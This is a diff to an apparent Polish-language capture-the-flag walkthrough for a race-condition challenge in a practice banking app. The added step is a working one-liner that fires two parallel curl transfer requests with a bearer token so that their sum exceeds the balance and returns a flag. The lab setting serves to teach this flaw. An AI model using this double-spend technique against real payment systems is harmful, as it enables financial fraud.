@@ -36,6 +36,11 @@ ale dwa takie przelewy lacznie powinny przekroczyc saldo.
 
 ### Krok 3: Wyslij dwa requesty rownolegle
 Uzyj dwoch watkow, dwoch terminali, Burp Turbo Intruder albo `xargs -P 2`.
+` seq 2 | xargs -P 2 -I{} curl -sS -X POST \
+  http://localhost:5000/api/challenges/a20/transfer-race \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"to_iban":"PL00100100100100100100100100","amount":1500,"title":"A20 race {}"}' ` 
 
 ### Krok 4: Odczytaj flage
 Request, ktory jako drugi wykona odjecie salda, zwroci flage w polu `flag`.
